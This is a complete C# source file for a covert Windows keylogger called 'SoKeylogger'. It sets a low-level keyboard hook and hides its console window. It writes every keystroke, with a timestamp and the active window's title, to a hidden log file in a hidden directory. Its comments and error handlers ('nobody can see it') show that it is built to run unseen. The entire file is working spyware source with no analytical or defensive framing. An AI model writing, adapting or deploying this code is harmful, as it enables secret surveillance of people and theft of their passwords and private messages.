using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

// script kiddo says:
// apagando las luces

namespace SoKeylogger
{
    internal sealed class Program
    {
        #region Settings

        // personal ID of this application. helps to sort log files
        private static readonly string KLGR_PERS_ID = "1";
        // directory path
        private static readonly string DIR_PATH = @"C:\directory name";
        // log file name
        private static readonly string LOG_FILENAME = @"\filename" + KLGR_PERS_ID + ".txt";
        // full path to log file
        private static readonly string LOGFILE_FP = DIR_PATH + LOG_FILENAME;

        #endregion

        #region Fields

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        const int SW_HIDE = 0;

        #endregion

        #region DLL

        // for keylogging
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        //----------------------------------------

        // for getting caption of active window
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowTextLength(IntPtr hWnd);
        //----------------------------------------

        #endregion

        private static void Main()
        {
            try
            {
                if (!Directory.Exists(DIR_PATH))
                {
                    DirectoryInfo di = Directory.CreateDirectory(DIR_PATH);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }

                if (!File.Exists(LOGFILE_FP))
                {
                    File.Create(LOGFILE_FP);
                    FileInfo fi = new FileInfo(LOGFILE_FP);
                    fi.Attributes = FileAttributes.Hidden;
                }

                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            }
            catch (Exception ex)
            { Console.WriteLine("nobody can see it"); }
        }

        #region Keylogging

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    File.AppendAllText(LOGFILE_FP, $"[{DateTime.Now}][{GetCaptionOfActiveWindow()}] -> " + (Keys)vkCode + Environment.NewLine, Encoding.UTF8);
                }
            }
            catch (Exception ex)
            { Console.WriteLine("nobody can see it"); }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string GetCaptionOfActiveWindow()
        {
            var strTitle = string.Empty;

            try
            {
                var handle = GetForegroundWindow();
                var intLength = GetWindowTextLength(handle) + 1;
                var stringBuilder = new StringBuilder(intLength);

                if (GetWindowText(handle, stringBuilder, intLength) > 0)
                    strTitle = stringBuilder.ToString();
            }
            catch (Exception ex)
            { Console.WriteLine("nobody can see it"); }

            return strTitle;
        }

        #endregion
    }
}